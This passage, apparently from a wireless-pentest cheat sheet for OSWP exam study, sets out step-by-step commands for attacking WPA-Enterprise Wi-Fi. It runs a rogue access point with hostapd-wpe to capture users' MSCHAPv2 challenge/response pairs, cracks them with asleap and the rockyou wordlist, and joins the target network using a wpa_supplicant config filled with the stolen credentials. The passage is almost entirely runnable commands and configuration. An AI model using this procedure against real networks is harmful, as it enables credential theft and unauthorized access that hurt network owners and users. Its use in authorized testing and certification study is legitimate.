##- Change values of ssid and channel (that you can retrieve in previous step) with target ssid and channel details in the file **/etc/hostapd-wpe/hostapd-wpe.conf**  
`nano /etc/hostapd-wpe/hostapd-wpe.conf`

## Capture the encrypted credentials (challenge/response) by using **hostapd-wpe**:  
`hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf`  
It shows multiple lines, keep at least one line of challenge/response per username, save it for later use.

## Crack the challenge/response with rockyou as a wordlist:  
`asleap -C <Challenge> -R <Response> -W /usr/share/wordlist/rockyou.txt`

## Create a new configuration file with below content; replace SSID with target AP name (eg: dlink-my-router), identity with username and clear-text password that you cracked previously  
`nano oswp-enterprise.conf`

    network={
            scan_ssid=1
            eap=PEAP
            ssid="<TARGET-NAME>"
            key_mgmt=WPA-EAP
            identity="<DOMAIN\USERNAME>"
            password="<PASSWORD>"
            phase1="peaplabel=0"
            phase2="auth=MSCHAPV2"
    }

## Connect to the configured enterprise WiFi  
`wpa_supplicant -B -i wlan0 -c ./<filename>.conf`
